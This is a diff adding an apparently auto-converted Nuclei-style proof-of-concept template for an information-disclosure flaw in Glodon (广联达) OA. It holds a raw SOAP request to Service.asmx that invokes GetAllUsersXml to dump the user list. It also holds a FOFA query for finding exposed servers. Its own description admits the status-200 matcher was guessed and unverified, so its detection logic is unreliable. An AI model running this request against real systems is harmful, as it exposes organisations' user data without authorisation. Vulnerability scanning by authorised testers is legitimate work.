@@ -1,0 +1,21 @@
+id: poc-1bfdd365fa71ecfb41be
+info:
+  name: 广联达OAService.asmx信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1bfdd365fa71ecfb41bebc1aefa07f1c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1bfdd365fa71ecfb41bebc1aefa07f1c
+    fofa: + app.name="广联达 OA"
+http:
+- raw:
+  - "POST /Org/service/Service.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/soap+xml; charset=utf-8\nContent-Length: length\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap12:Body>\n    <GetAllUsersXml xmlns=\"http://tempuri.org/\" />\n  </soap12:Body>\n\n</soap12:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
